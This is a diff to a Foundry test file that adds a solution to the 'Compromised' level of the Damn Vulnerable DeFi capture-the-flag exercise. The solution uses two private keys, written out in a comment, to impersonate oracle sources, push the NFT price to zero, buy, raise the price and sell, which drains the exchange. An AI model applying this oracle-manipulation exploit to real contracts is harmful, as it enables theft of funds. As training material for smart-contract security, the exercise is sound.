@@ -9,6 +9,7 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {ExploitCompromised} from "./ExploitCompromised.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -71,11 +72,31 @@ contract CompromisedChallenge is Test {
         assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
     }
 
+    function setPriceAsCompromisedOracles(uint price) public {
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], price);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[1], price);
+        vm.stopPrank();
+    }
+
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // hex->bytes->base64decode
+        // PKEY1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+        // PKEY2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+
+        ExploitCompromised exploit = new ExploitCompromised{value: address(this).balance}(oracle, exchange, nft, recovery);
+        setPriceAsCompromisedOracles(0);
+        exploit.buy();
+        setPriceAsCompromisedOracles(EXCHANGE_INITIAL_ETH_BALANCE);
+        exploit.sell();
+        exploit.sendRecoveredFunds(EXCHANGE_INITIAL_ETH_BALANCE);
+
+
     }
 
     /**
